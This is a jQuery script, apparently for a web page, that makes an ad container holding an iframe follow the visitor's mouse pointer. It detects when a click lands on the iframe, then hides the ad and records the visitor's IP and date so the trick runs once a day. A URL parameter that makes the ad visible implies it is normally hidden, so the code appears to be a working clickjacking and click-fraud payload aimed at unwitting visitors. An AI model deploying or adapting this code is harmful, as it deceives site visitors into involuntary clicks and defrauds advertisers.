$(document).ready(function(){
	//	Agregado por Jorge Colmenarez 2015-03-25 10:46 
	//	Evitar que copien/descarguen los archivos
	//var urlfile = $('#link').attr('src');
	//urlfile = urlfile.substring(0,30);
	//if(urlfile == 'http://www.adsmaster.net23.net'){
		var entrar = false;
		var mypublic;
		//	Agregado por Jorge Colmenarez 2016-03-28 20:26
		//	Variable que permitirá la ejecución del codigo.
		var time = 0;
		//	Fin Jorge Colmenarez
		//	Agregado por Jorge Colmenarez 2015-03-25 10:21 
		//	Definimos las variables globales ip, dia, mes, ano segun lo que tenga almacenado el localStorage
		if(!localStorage.getItem('ip')){
			var ip;
			var dia;
			var mes;
			var ano;	
		}else{
			var ip=localStorage.getItem("ip");
			var dia=localStorage.getItem("dia");
			var mes=localStorage.getItem("mes");
			var ano=localStorage.getItem("ano");
		}
		//	Agregado por Jorge Colmenarez 2015-03-25 09:58 
		//	Capturamos la Ip de la Persona que esta Entrando a nuestra pagina
		function GetIP(){
			$.getJSON("https://api.ipify.org?format=json",function(data){
				//direccion ip
				ip = data.ip; 
				//variables de la fecha
				var fecha = new Date();
				dia = fecha.getDate();
				mes = fecha.getMonth() + 1;
				ano = fecha.getFullYear();
			});
		}
		//	Fin Jorge Colmenarez
		//Metodo para Capturar las variables de Tipo get Usando Javascript
		/**
		*	Comentado por Jorge Colmenarez 2015-09-04 23:05 
		*	Reemplazo de función por optimización de codigo
		function getVariables(){
			var loc = document.location.href;
			var getString = loc.split('?')[1];
			if(!getString){
				var loc = document.location.href+"?ads=no";
				var getString = loc.split('?')[1];
			}
		    var GET = getString.split('&');
		  	var get = {};//this object will be filled with the key-value pairs and returned.
		   
		   for(var i = 0, l = GET.length; i < l; i++){
		      var tmp = GET[i].split('=');
		      get[tmp[0]] = unescape(decodeURI(tmp[1]));
		   }
		   return get;
		}
		**/
		/**
		*	Agregado por Jorge Colmenarez 2015-09-04 23:02
		*	Función getQueryParams permite obtener un objeto con los parametros enviados por get
		**/
		function getQueryParams(qs) {
			qs = qs.split("+").join(" ");
			var params = {},
			tokens,
			re = /[?&]?([^=]+)=([^&]*)/g;

			while (tokens = re.exec(qs)) {
				params[decodeURIComponent(tokens[1])]
					= decodeURIComponent(tokens[2]);
			}

			return params;
		}
		/**
		*	Fin Jorge Colmenarez
		**/
		//--------------------------------------------------------------------------------//
		/**
		*	Comentado por Jorge Colmenarez 2015-09-04 23:07
		*	var varsGet = getVariables(); 
		*	Llamado de nueva función getQueryParams(x);
		*/
		var varsGet = getQueryParams($(location).attr('search'));
		/**
		*	Agregado por Jorge Colmenarez 2015-09-07 11:30
		*	Hacer visible el anuncio mediante el parametro show 
		*/
		if(varsGet["show"]=="s"){
			localStorage.clear();
			$('#content-ads').css("opacity","3");
		}else if(varsGet["show"]=="n"){
			localStorage.clear();
		}
		/**
		*	Fin Jorge Colmenarez
		**/
		//	Habilitar el Anuncio
		if(varsGet["ads"] == "si"){
			entrar = true;
		}else{
			$('#content-ads').css({position:"relative",opacity:"3"});
		}
		//	Agregado por Jorge Colmenarez 2016-03-28 20:27 
		//	Establecer valor en la variable time si parametro time esta definido
		if(varsGet["time"]){
			time = varsGet["time"]*1000;
		}
		//	Fin Jorge Colmenarez
		//Aqui se valida si viene la variable o no
		if(entrar){
			setTimeout(logicaNegocio,time);
			//logicaNegocio();
		}
		//Inicio Logica de Negocio
		function logicaNegocio(){
			//	Agregado por Jorge Colmenarez 2016-03-25 10:06 
			//	Llamado de metodo que captura los datos del visitante
			GetIP();
			//	Fin Jorge Colmenarez 
			//Ver si Se puede Usar localStorage
			if(window['localStorage']){
				//console.log("validacion localStorage");
				if(localStorage.getItem("ip")){
					//console.log("la variable ip trae algo");
					if(localStorage.getItem("ip") == ip){
						//console.log("las ip son iguales");
						if(localStorage.getItem("mes") == mes){
							//console.log("el mes es igual");
							if(localStorage.getItem("dia") == dia){
								//console.log("el dia es igual");
								valido = false;
								movepoint(valido);
							}else{
								//localStorage.removeItem("dia");
								//localStorage.setItem("dia",dia);
								valido = true;
								movepoint(valido);
							}
						}else{
							//localStorage.removeItem("mes");
							//localStorage.removeItem("dia");
							//localStorage.setItem("mes",mes);
							//localStorage.setItem("dia",dia);
							valido = true;
							movepoint(valido);
						}
					}else{
						//localStorage.clear();
						//localStorage.setItem("ip",ip);
						//localStorage.setItem("dia",dia);
						//localStorage.setItem("mes",mes);
						//localStorage.setItem("ano",ano);
						valido = true;
						movepoint(valido);
					}
				}else{
					//localStorage.clear();
					//localStorage.setItem("ip",ip);
					//localStorage.setItem("dia",dia);
					//localStorage.setItem("mes",mes);
					//localStorage.setItem("ano",ano);
					valido = true;
					movepoint(valido);
				}
			}else{
				//console.log("No Soporta LocalSorage");
				valido = true;
				movepoint(v)
			}
			//Funcion que Hace que el Anuncio Persiga al Puntero
			function movepoint(v){
				if(v){
					$("div#content-ads").mouseenter(function(){
					   	mypublic = $(this);
					});
					//	Función que oculta la publicidad
				   	function hide_publicidad(i){
				    	valor = setInterval(function(){
					        if(i>1){
								mypublic.css("display","none");
								clearInterval(valor);
					        }
					        i++;
				    	},500);
				   	}
				   	//	Fin ocultar publicidad
				   	//	Función que verifica si se dió clic en el iframe
					function clickActivo(){
						return $(document.activeElement).is('IFRAME') || $(document.activeElement).is('iframe');
				   	}
				   	//	Fin verificación clic
					var ant = setInterval(function(){
						if(clickActivo()){
							//	Agregado por Jorge Colmenarez 2016-03-25 09:54
							//	Establecer datos de la ip solo cuando se ha ejecutado el clic sobre el anuncio
							//console.log(ip+" "+dia+"/"+mes+"/"+ano);
							localStorage.setItem("ip",ip);
							localStorage.setItem("dia",dia);
							localStorage.setItem("mes",mes);
							localStorage.setItem("ano",ano);
							//console.log(localStorage);
							//	Removemos el anuncio para que no sea necesario recargar la página
							hide_publicidad(1);
							clearInterval(ant);
							//	Fin Jorge Colmenarez
						}
					},100);
					$(document).mousemove(function(e){
						$("div#content-ads").css( {"top":(e.clientY-140), "left":(e.clientX-168) });
					});
				}else{
					var padre = document.getElementById("content-ads").parentNode;
					var hijo = document.getElementById("content-ads");
					padre.removeChild(hijo);
				}
			}
		}
		//Fin logica Negocio
	//}else{
	//	alert("¡No te servira el código, por plagiador!");
	//}
	//	Fin Jorge Colmenarez
});
